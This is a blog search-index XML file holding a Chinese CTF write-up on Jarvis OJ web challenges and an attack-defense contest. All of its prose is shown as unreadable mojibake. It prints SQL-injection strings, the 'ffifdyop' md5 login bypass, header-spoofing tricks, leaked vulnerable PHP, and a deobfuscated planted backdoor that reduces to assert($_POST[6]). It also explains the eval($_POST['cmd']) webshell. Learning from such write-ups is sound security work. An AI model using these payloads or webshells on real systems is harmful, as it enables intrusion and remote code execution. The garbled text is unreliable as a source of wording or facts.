<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[CTF-writeup]]></title>
      <url>/2019/07/08/CTF-writeup/</url>
      <content type="html"><![CDATA[<h1 id="CTF-writeup"><a href="#CTF-writeup" class="headerlink" title="CTF writeup"></a>CTF writeup</h1><p>éƒ½æ˜¯èœé¸¡æ€»ç»“çš„ä¸€äº›å¸¸è¯†, dalaoä»¬è¯·ç»•è·¯(å‘æŠ–)<br>ä½†æ˜¯ä¹Ÿæ¬¢è¿å¤§ä½¬ä»¬æ¥çº æ­£é”™è¯¯<br>èœé¸¡ä¸èƒœæ„Ÿæ¿€</p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="localhost-resolved"><a href="#localhost-resolved" class="headerlink" title="localhost(resolved)"></a><a href="http://web.jarvisoj.com:32774/" target="_blank" rel="noopener">localhost</a>(resolved)</h3><p>é¢˜ç›®ä¸­åªæœ‰ä¸€è¡Œ <strong>localhost access only!!</strong><br><a href="https://link.jianshu.com/?t=http://www.111cn.net/phper/php-cy/59523.htm" target="_blank" rel="noopener">PHPè·å–ç”¨æˆ·IPåœ°å€</a><br>æ‰€ä»¥éœ€è¦ä¼ªé€ è‡ªå·±çš„IPåœ°å€<br>ä¸€ä¸ªæ¯”è¾ƒç®€å•çš„æ–¹æ³•æ˜¯åœ¨HTTPçš„è¯·æ±‚å¤´ä¸­æ·»åŠ å‚æ•°:<code>X-Forwarded-For : éœ€è¦ä¼ªé€ çš„IP</code><br>å¯ä»¥ä½¿ç”¨burp suiteæŠ“åŒ…æˆ–PostManæ¥å®ç°</p>
<figure class="image-box">
                <img src="http://whoisyourdaddy.cf/picture/X-Forwarded-For.png" alt title class>
                <p></p>
            </figure>
<p>ç±»ä¼¼çš„, å¯ä»¥ä¼ªé€ <code>Referer</code><br><code>Referer</code>è¡¨æ˜äº†ç”¨æˆ·æ˜¯ä»å“ªä¸ªé¡µé¢è·³è½¬æ¥çš„.<br>ä¾‹å¦‚<br><code>Referer: https://www.google.com</code></p>
<h3 id="admin-resolved"><a href="#admin-resolved" class="headerlink" title="admin(resolved)"></a><a href="http://web.jarvisoj.com:32792/" target="_blank" rel="noopener">admin</a>(resolved)</h3><p>è¿›å…¥ç½‘é¡µåªæœ‰ä¸€ä¸ªhello world<br>æŸ¥çœ‹ç½‘é¡µä»£ç ,æ²¡æœ‰çº¿ç´¢<br>å°è¯•robots.txt,ç½‘é¡µè·³è½¬,ä½†æ˜¯å‡ºç°äº†ä¸€ä¸ªå‡flag<br>burp suiteæŠ“åŒ…, ä¿®æ”¹å‚æ•°admin = 1,followåå‡ºç°çœŸçš„flag</p>
<h3 id="login-working"><a href="#login-working" class="headerlink" title="login(working)"></a><a href="http://web.jarvisoj.com:32772/" target="_blank" rel="noopener">login</a>(working)</h3><p>è¿›å…¥é¢˜ç›®åªæœ‰ä¸€ä¸ªç™»é™†æ¡†ï¼Œ<br>å³é”®æºç ï¼Œå‘ç°å¯†ç æ ¡éªŒä¸åœ¨æœ¬åœ°ï¼Œ<br>ä½¿ç”¨BurpSuiteåœ¨åå°å¯†ç çˆ†ç ´ï¼Œ<br>åŒæ—¶å°è¯•ä½¿ç”¨ sql æ³¨å…¥<br>è¾“å…¥ <code>1&#39;or&#39;1&#39;or&#39;1</code>,<br>å¾—åˆ°ä¸€ä¸ªå¥‡æ€ªçš„å“åº”,</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /opt/lampp/htdocs/index.php on line 14</span><br><span class="line">Wrong Password.</span><br></pre></td></tr></table></figure>

<p>æ­£å½“ç™¾æ€ä¸å¾—å…¶è§£æ—¶,<br>æŸ¥çœ‹ä¸‹çˆ†ç ´æ—¶çš„ response åŒ…,ç«Ÿç„¶æœ‰æç¤º</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hint: &quot;select * from `admin` where password=&apos;&quot;.md5($pass,true).&quot;&apos;&quot;</span><br></pre></td></tr></table></figure>

<p>å…³äºmd5(string,raw)å‡½æ•°:</p>
<ul>
<li>stringå¿…éœ€, è§„å®šè¦è®¡ç®—çš„å­—ç¬¦ä¸²</li>
<li>rawå¯é€‰, è§„å®šåå…­è¿›åˆ¶æˆ–äºŒè¿›åˆ¶è¾“å‡ºæ ¼å¼(TRUEæˆ–FALSE)</li>
</ul>
<p>2019/7/4æ—¥ è¡¥å……:<br>åŸæ¥hinté‡Œå·²ç»è¯´çš„å¾ˆæ¸…æ¥šäº†, å°±æ˜¯å…ˆæŠŠæˆ‘ä»¬çš„å‚æ•°md5åŠ å¯†åå†æ‰§è¡ŒæŸ¥è¯¢.<br>å¦‚æœæˆ‘ä»¬æƒ³æ„é€ payload, éœ€è¦ä½¿ md5($pass,true) çš„ç»“æœä¸­å‡ºç° <code>&#39;or&#39;</code> , æ‰å¯èƒ½ç»•è¿‡.<br>é’ˆå¯¹è¿™ä¸ªé—®é¢˜, å·²ç»æœ‰äº†ç°æˆçš„payload â€“ <code>ffifdyop</code><br>è¿™æ˜¯å› ä¸º :<br>MD5(â€˜ffifdyopâ€™) =&gt; <code>276f722736c95d99e921722cf9ed621c</code>  #md5åŠ å¯†<br><code>276f722736c95d99e921722cf9ed621c</code> =&gt;  â€˜orâ€™6&lt;ä¹±ç &gt;     #è½¬ä¸ºå­—ç¬¦ä¸²</p>
<h3 id="ç¥ç›¾å±€çš„ç§˜å¯†-working"><a href="#ç¥ç›¾å±€çš„ç§˜å¯†-working" class="headerlink" title="ç¥ç›¾å±€çš„ç§˜å¯†(working)"></a><a href="http://web.jarvisoj.com:32768/" target="_blank" rel="noopener">ç¥ç›¾å±€çš„ç§˜å¯†</a>(working)</h3><p>è¿›å…¥é¢˜ç›®, åœ¨å¼€å‘è€…å·¥å…·ä¸­å‘ç°æœ‰ä»£ç </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;showimg.php?img=c2hpZWxkLmpwZw==&quot; width=&quot;100%&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>ä¼ ç»™imgçš„å‚æ•°æ˜¯è¢«base64åŠ å¯†è¿‡äº†,<br>æ‰€ä»¥å¦‚æœæˆ‘ä»¬æƒ³åˆ©ç”¨è¿™ä¸ªå‚æ•°æäº‹,ä¹Ÿå¿…é¡»å…ˆç”¨base64åŠ å¯†</p>
<p>é¦–å…ˆå¯¹ <code>index.php</code> åŠ å¯†å¾—åˆ° <code>aW5kZXgucGhw</code><br>å°†å®ƒä½œä¸ºå‚æ•°ä¼ ç»™URL:<br><code>http://web.jarvisoj.com:32768/showimg.php?img=aW5kZXgucGhw</code><br>è¿”å›çš„é¡µé¢ä¸­æœ‰ä»£ç  :</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--?php </span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</span><br><span class="line">	$x = <span class="keyword">new</span> Shield();</span><br><span class="line">	<span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]) &amp;&amp; $g = $_GET[<span class="string">'class'</span>];</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</span><br><span class="line">		$x = unserialize($g);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">echo</span> $x---&gt;</span><br></pre></td></tr></table></figure>

<p>æ—¢ç„¶ä»urlä¸­çœ‹å‡ºæœ‰ä¸ªæ–‡ä»¶åå­—å«<code>showimg.php</code>, ä»¥åŒæ ·çš„æ–¹æ³•å°†å…¶ä½œä¸ºå‚æ•°,è®¿é—®url:<code>http://web.jarvisoj.com:32768/showimg.php?img=c2hvd2ltZy5waHA=</code><br>ä¹Ÿæœ‰ä»£ç  :</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--?php</span><br><span class="line">	$f = $_GET[<span class="string">'img'</span>];</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($f)) &#123;</span><br><span class="line">		$f = base64_decode($f);</span><br><span class="line">		<span class="keyword">if</span> (stripos($f,<span class="string">'..'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'\\'</span>)===<span class="keyword">FALSE</span></span><br><span class="line">		&amp;&amp; stripos($f,<span class="string">'pctf'</span>)===<span class="keyword">FALSE</span>) &#123;</span><br><span class="line">			readfile($f);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"File not found!"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">?--&gt;</span><br></pre></td></tr></table></figure>

<p>ç„¶è€Œæš‚æ—¶è¿˜ä¸æ‡‚ä»£ç çš„é€»è¾‘, å›æ¥å†è¯´</p>
<h3 id="IN-A-MESS-working"><a href="#IN-A-MESS-working" class="headerlink" title="IN A MESS(working)"></a><a href="http://web.jarvisoj.com:32780/index.phps" target="_blank" rel="noopener">IN A MESS</a>(working)</h3><p>è¿›å…¥é¢˜ç›®åªæœ‰ä¸€å¥ <code>work harder!harder!harder!</code><br>è§‚å¯Ÿurlæœ‰ä¸ªå‚æ•°id,ä¸ç®¡æ€æ ·,<br>å…ˆåå°çˆ†ç€å†è¯´.<br>ç„¶è€Œå¹¶æ²¡æœ‰ä»€ä¹ˆåµç”¨.<br>çœ‹responseåŒ…é‡Œ,æœ‰ä¸ªindex.phps <em>ä¸€å¼€å§‹æˆ‘æ ¹æœ¬æ²¡çœ‹å‡ºæ¥å’Œindex.phpä¸ä¸€æ ·</em> :/<br>è®¿é—®,æœ‰å¦‚ä¸‹ä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;!--index.phps--&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'id'</span>])</span><br><span class="line">&#123;</span><br><span class="line">	header(<span class="string">'Location: index.php?id=1'</span>);</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">if</span>(stripos($a,<span class="string">'.'</span>))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'Hahahahahaha'</span>;</span><br><span class="line">	<span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,<span class="string">'r'</span>);</span><br><span class="line"><span class="keyword">if</span>($data==<span class="string">"1112 is a nice lab!"</span> <span class="keyword">and</span> $id==<span class="number">0</span> <span class="keyword">and</span> strlen($b)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi(<span class="string">"111"</span>.substr($b,<span class="number">0</span>,<span class="number">1</span>),<span class="string">"1114"</span>) <span class="keyword">and</span> substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">require</span>(<span class="string">"flag.txt"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"work harder!harder!harder!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ„é€ payloadæ¯”è¾ƒå¤æ‚, å›å†è¯´å§</p>
<p><a href="https://www.cnblogs.com/baifan2618/p/7815090.html" target="_blank" rel="noopener">å‚è€ƒ</a></p>
<h3 id="PORT51-resolved"><a href="#PORT51-resolved" class="headerlink" title="PORT51(resolved)"></a><a href="http://web.jarvisoj.com:32770/" target="_blank" rel="noopener">PORT51</a>(resolved)</h3><p>æ ¹æ®é¢˜ç›®, åº”è¯¥æ˜¯éœ€è¦ä»¥æŒ‡å®šçš„51ç«¯å£è®¿é—®.<br>åœ¨æœ¬åœ°cmd</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --local-port 51 http://web.jarvisoj.com:32770/</span><br></pre></td></tr></table></figure>

<p>å¹¶æ²¡æœ‰ä»€ä¹ˆåµç”¨, å¾—åˆ°çš„å“åº”å’Œåœ¨æµè§ˆå™¨ä¸Šæ²¡åŒºåˆ«,<br>ä½†æ˜¯ä½¿ç”¨æœåŠ¡å™¨, è¾“å…¥åŒæ ·çš„å‘½ä»¤å¯ä»¥æˆåŠŸ, æš‚æ—¶å­˜ç–‘<br>åæ­£,<br>flag æ‹¿åˆ°äº†å¯¹å§ :(</p>
<h3 id="TSCTF-resolved"><a href="#TSCTF-resolved" class="headerlink" title="TSCTF(resolved)"></a>TSCTF(resolved)</h3><figure class="image-box">
                <img src="http://whoisyourdaddy.cf/picture/TSCTF.jpeg" alt title class>
                <p></p>
            </figure>

<p>è¿™åº”è¯¥ç®—æ˜¯æˆ‘ç¬¬ä¸€æ¬¡å‚è§æ¯”è¾ƒæ­£å¼çš„CTFçº¿ä¸‹èµ›å§</p>
<p>èƒ½å¾—å¥–åŸºæœ¬å°±æ˜¯é æŠ±å¤§è…¿</p>
<p>æ²¡ä»€ä¹ˆæƒ³å¤šè¯´çš„</p>
<p>åªå¸Œæœ›æ˜å¹´è¿™å¤©</p>
<p>æˆ‘æ˜¯D.I.Eçš„ä¸»åŠ›</p>
<h4 id="æµé‡ç›‘å¬"><a href="#æµé‡ç›‘å¬" class="headerlink" title="æµé‡ç›‘å¬"></a>æµé‡ç›‘å¬</h4><p>æ‰“ç®—åœ¨æ¯”èµ›æ—¶å¯ä»¥é€šè¿‡ç›‘å¬å·¥å…·,æŠ“å–è‡ªå®¶æœåŠ¡å™¨çš„æµé‡,<br>å°±ç®—é¢˜ç›®æ²¡æœ‰å¤´ç»ª, è¿˜å¯ä»¥åˆ†æä¸€æ³¢åˆ«äººçš„ payload.</p>
<p><strong>tshark</strong><br>éœ€è¦å…ˆè‡ªè¡Œå®‰è£…ä¸€ä¸‹.<br><strong>åŸºæœ¬æ¯ä¸ªå‘½ä»¤éƒ½éœ€è¦rootæƒé™<code>sudo</code></strong></p>
<ul>
<li>æ˜¾ç¤ºå¯ç”¨ç½‘å¡ <code>tshark -D</code></li>
<li>æŠ“åŒ…  ä½¿ç”¨å‘½ä»¤ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tshark  -c [æ•°å­—]  -w [æ–‡ä»¶å.pcap] -f [æ•è·è¿‡æ»¤å™¨]</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">+ -c è¡¨ç¤ºæŠ“å¤šå°‘åŒ…ååœæ­¢</span><br><span class="line">+ -w æŠŠæŠ“åŒ…ç»“æœè¾“å…¥åˆ°æ–‡ä»¶ä¸­, æ— éœ€æå‰åˆ›å»º, è‹¥ç›®å½•ä¸‹æ²¡æœ‰, è‡ªåŠ¨åˆ›å»º</span><br><span class="line">+ -f è®¾ç½®æ•è·è¿‡æ»¤å™¨, æˆ‘ä»¬æ­¤å¤„ä¸»è¦é’ˆå¯¹httpçš„æ•°æ®åŒ…, æ‰€ä»¥å‚æ•°è®¾å®šä¸º &quot;port 80&quot;</span><br><span class="line"></span><br><span class="line">ä½†æ˜¯æ ¹æ®æˆ‘çš„è¯•éªŒ, å‡¡æ˜¯ä½¿ç”¨tsharkåäº§ç”Ÿçš„æ–‡ä»¶æƒé™éƒ½ååˆ†æ•æ„Ÿ, æ²¡æ³•ç”¨finalshell ç›´æ¥ä¸‹è½½, ä¸ºäº†æ–¹ä¾¿èµ·è§, å†è¡¥å……ä½¿ç”¨ tcpdump çš„æ–¹æ³•</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>tcpdump -s  [æ•°å­—]  -w [æ–‡ä»¶.pcap] port [ç«¯å£æ•°]</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">+ -s è¡¨ç¤ºä¸€ä¸ªåŒ…æˆªæ–­çš„é•¿åº¦, 0è¡¨ç¤ºä¸æˆªæ–­, å®Œæ•´çš„ä¿å­˜ä¸‹æ¥</span><br><span class="line">+ -w è¾“å…¥åˆ°æ–‡ä»¶</span><br><span class="line">+ port ç›‘å¬çš„ç«¯å£</span><br><span class="line"></span><br><span class="line">**ä½¿ç”¨ tcpdump åŒæ ·éœ€è¦sudo**</span><br><span class="line">ç„¶è€Œè¿™åœºæ¯”èµ›æ²¡æœ‰rootæƒé™, è‡ªç„¶ä¹Ÿå°±æ²¡æ³•ç”¨sudo, æˆ‘, , ,</span><br><span class="line"></span><br><span class="line">#### è‡ªåŠ¨æäº¤ flag çš„ python è„šæœ¬</span><br><span class="line"></span><br><span class="line">```py</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">def submit(flag, token):                           # å®šä¹‰å‡½æ•° submit</span><br><span class="line">	url = &quot;wangzhi&quot;                            # éœ€è¦è®¾ç½®çš„å‚æ•°  url</span><br><span class="line">	pos = &#123;                                    # å­—å…¸ï¼Œpythonçš„ä¸€ç§å¯å˜å®¹å™¨æ¨¡å‹</span><br><span class="line">	    &quot;flag&quot;:flag,</span><br><span class="line">	    &quot;token&quot;:token</span><br><span class="line">	&#125;                                          # æ‰€ä»¥ pos[&quot;flag&quot;] = flag</span><br><span class="line">	print &quot;[+] Submiting flag : [%s]&quot; % (pos)  # æ ¼å¼åŒ–è¾“å‡º pos</span><br><span class="line">	response = requests.post(url,data=pos)     # response æ¥æ”¶ request.post()è¿”å›çš„å¯¹è±¡(?),å…¶æœ‰è®¸å¤šæ•°æ®åŸŸ</span><br><span class="line">	content = response.content                 # content æ¥æ”¶ responseçš„æ•°æ®åŸŸcontent, äºŒè¿›åˆ¶æ•°æ®</span><br><span class="line">	print &quot;[+] Content : %s &quot; % (content)      # æ ¼å¼åŒ–è¾“å‡ºcontent</span><br><span class="line">	if failed in content:                      # è‹¥æˆåŠŸæäº¤, è¿”å›True,åä¹‹è¿”å›False</span><br><span class="line">		print &quot;[-]failed&quot;</span><br><span class="line">		return False</span><br><span class="line">	else:</span><br><span class="line">		print &quot;[+] Success!&quot;            </span><br><span class="line">		return True</span><br></pre></td></tr></table></figure>

<p>ç„¶è€Œç›®å‰æˆ‘çš„pythonç¯å¢ƒè¿˜æœ‰ç‚¹é—®é¢˜, æš‚æ—¶æ²¡æ³•æ­£å¸¸è¿è¡Œ<br>è£…äº†python3, åˆè£…python2<br>è£…pythonä¸€æ—¶çˆ½,<br>ä¸€ç›´è£…ä¸€ç›´çˆ½ ğŸ˜­</p>
<h4 id="ç¬¬ä¸€ä¸ªæ¼æ´"><a href="#ç¬¬ä¸€ä¸ªæ¼æ´" class="headerlink" title="ç¬¬ä¸€ä¸ªæ¼æ´"></a>ç¬¬ä¸€ä¸ªæ¼æ´</h4><p>å¼€å±€ç™»é™†è¿›ä¸»æœºå, è¿…é€Ÿä½¿ç”¨ä¸‹è½½æ•´ä¸ªç½‘ç»œç›®å½•åˆ°æœ¬åœ°<br>Dç›¾æ‰«æå‡ºä¸€ä¸ªé«˜å±æ–‡ä»¶!<code>.202cb962ac59075b964b07152d234b70.ini.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@$_=<span class="string">'s'</span>.<span class="string">'s'</span>.<span class="comment">/*-/*-*/</span><span class="string">'e'</span>.<span class="comment">/*-/*-*/</span><span class="string">'r'</span>;</span><br><span class="line">@$_=<span class="comment">/*-/*-*/</span><span class="string">'a'</span>.<span class="comment">/*-/*-*/</span>$_.<span class="comment">/*-/*-*/</span><span class="string">'t'</span>;</span><br><span class="line">@$_<span class="comment">/*-/*-*/</span>($<span class="comment">/*-/*-*/</span>&#123;<span class="string">'_P'</span>.<span class="comment">/*-/*-*/</span><span class="string">'OS'</span>.<span class="comment">/*-/*-*/</span><span class="string">'T'</span>&#125;</span><br><span class="line">[<span class="comment">/*-/*-*/</span><span class="number">0</span><span class="comment">/*-/*-*/</span>+<span class="comment">/*-/*-*/</span><span class="number">3</span><span class="comment">/*-/*-*/</span>+<span class="comment">/*-/*-*/</span><span class="number">3</span><span class="comment">/*-/*-*/</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªæ–‡ä»¶å½“æ—¶æ²¡æœ‰çœ‹æ‡‚ï¼Œä½†æ˜¯ç°åœ¨ç»è¿‡å­¦é•¿çš„æŒ‡ç‚¹æœ‰ç‚¹æ¸…æ™°äº†<br>å…¶å®ä»£ç ä¸­æœ‰ç€å¤§é‡çš„éšœçœ¼æ³•<br>é¦–å…ˆæ˜¯å¤§é‡çš„æ³¨é‡Šï¼ŒæŠŠå®ƒä»¬å»æ‰å</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@$_=<span class="string">'s'</span>.<span class="string">'s'</span>.<span class="string">'e'</span>.<span class="string">'r'</span>;</span><br><span class="line">@$_=<span class="string">'a'</span>.$_.<span class="string">'t'</span>;</span><br><span class="line">@$_($&#123;<span class="string">'_P'</span>.<span class="string">'OS'</span>.<span class="string">'T'</span>&#125;</span><br><span class="line">[<span class="number">0</span>+<span class="number">3</span>+<span class="number">3</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å…¶å®è¿™é‡Œçœ‹å‡ºä»æœ‰å¾ˆå¤šæ‹¼æ¥è¿ç®—åœ¨é˜»ç¢æˆ‘ä»¬åˆ†æ,<br>æˆ‘ä»¬ç›´æ¥å†™å‡ºæ‹¼æ¥åçš„ç»“æœ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@$_=<span class="string">'assert'</span>;</span><br><span class="line">@$_($&#123;<span class="string">'_POST'</span>&#125;[<span class="number">6</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬çœ‹åˆ°,è¿™ä¸¤è¡Œä»£ç ä¸­éƒ½æœ‰å˜é‡<code>$_</code>,<br>èµ·åˆæˆ‘ä¸çŸ¥é“è¿™æ˜¯ä»€ä¹ˆæ„æ€, å…¶å®å°±æ˜¯ç›¸å½“äºæ–‡æœ¬çš„æ›¿æ¢<br>å› ä¸º<code>$_</code>å­˜æ”¾çš„æ˜¯å­—ç¬¦ä¸², æ‰€ä»¥phpçš„è§£é‡Šå™¨åœ¨åˆ†ææ—¶ä¹Ÿä»…ä»…æ˜¯æŠŠå†…å®¹åŸå°ä¸åŠ¨çš„æ”¾åœ¨è¿™é‡Œ<br>é‚£ä¹ˆè¿™æ®µä»£ç å°±æ˜¯</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @assert($_POST[<span class="number">6</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è€Œä¸€å¥è¯æœ¨é©¬<code>&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;</code><br>å…¶ä¸­assert()å’Œeval()çš„æ•ˆæœç±»ä¼¼<br>æ‰€ä»¥è¿™ä¸ªæ–‡ä»¶é‡Œå°±æ˜¯æš—è—ä¸€å¥è¯æœ¨é©¬!</p>
<h4 id="ä¸€å¥è¯æœ¨é©¬çš„åŸç†"><a href="#ä¸€å¥è¯æœ¨é©¬çš„åŸç†" class="headerlink" title="ä¸€å¥è¯æœ¨é©¬çš„åŸç†"></a>ä¸€å¥è¯æœ¨é©¬çš„åŸç†</h4><p>ä¹‹å‰ä½¿ç”¨ä¸€å¥è¯æœ¨é©¬ä¹Ÿæœ‰å¥½å‡ æ¬¡äº†,<br>ä½†æ˜¯åŸºæœ¬éƒ½æ˜¯ç”¨èœåˆ€ç›´è¿, å´å¯¹å®ƒçš„åŸç†ä¸ç”šäº†è§£.<br>å€Ÿè¿™ä¸ªæœºä¼šèµ¶ç´§æŠŠphpçš„ä¸€äº›ç»†èŠ‚ä¸Šçš„ä¸œè¥¿ææ¸…æ¥š.</p>
<p>å¸¸è§çš„ä¸€å¥è¯æœ¨é©¬</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>eval()å‡½æ•°</strong> : ä¼šæŠŠé‡Œé¢çš„å˜é‡å½“æˆphpä»£ç æ¥æ‰§è¡Œ.<br>å¦‚æœè¯´ <code>$_post[&#39;cmd&#39;]</code> æ­¤æ—¶çš„å€¼æ˜¯<code>print &#39;hello world&#39;</code>, é‚£ä¹ˆå®ƒè¿è¡Œèµ·æ¥çš„å›æ˜¾å°±æ˜¯<code>hello world</code><br>å¦‚æœ<code>%_post[&#39;cmd&#39;]</code>çš„å€¼æ˜¯<code>system(&#39;cat flag&#39;)</code>, é‚£ä¹ˆåœ¨æœåŠ¡å™¨ç«¯å°±ä¼šæ‰§è¡Œ<code>cat flag</code>å‘½ä»¤å¹¶åœ¨æµè§ˆå™¨ä¸Šå›æ˜¾<br>ä¹Ÿå°±æ˜¯è¯´, è¿æ¥ä¸Šäº†ä¸€å¥è¯, ä½ å°±å¯ä»¥ç”¨è¿™ä¸ªå‡½æ•°éšä¾¿<del>åšçˆ±åšçš„äº‹æƒ…</del>æäº‹, å‰ææ˜¯æœ‰è¶³å¤Ÿçš„æƒé™</p>
</li>
